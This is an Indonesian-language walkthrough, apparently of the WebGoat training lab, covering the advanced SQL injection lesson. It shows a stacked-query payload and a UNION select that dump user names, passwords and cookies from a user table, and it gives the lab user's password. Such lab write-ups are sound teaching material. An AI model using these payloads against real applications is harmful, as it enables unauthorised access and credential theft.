# SQL Injection (advanced)
## Try It! Pulling data from other tables
- Masukkan query injection sebagai berikut lalu tekan tombol **Get Account Info**
```sh
'; select * from user_system_data; --
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%201.JPG)

- Setelah data tampil, kita dapat menemukan password user dave

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%202.JPG)

- Masukkan password user dave ke field Password dan tekan tombol **Check Password**
```sh
passW0rD
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%204.JPG)

- Selain query injection diatas, kita juga bisa memasukkan query sebagai berikut
```sh
' union select userid, user_name, password, cookie, null as c1, null as c2, null as c3 from user_system_data; --
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%205.JPG)
